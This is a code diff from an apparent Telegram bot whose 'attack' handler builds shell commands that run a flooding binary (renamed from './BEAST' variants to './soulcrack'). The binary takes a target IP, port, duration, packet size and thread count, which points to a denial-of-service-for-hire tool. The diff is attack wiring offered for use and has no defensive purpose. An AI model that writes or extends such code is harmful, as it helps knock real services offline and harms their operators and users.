@@ -396,11 +396,11 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./BEAST3 {ip} {port} {duration}"
+        attack_command = f"./soulcrack {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./BEAST4 {ip} {port} {duration} {threads}"
+        attack_command = f"./soulcrack {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./BEAST5 {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./soulcrack {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
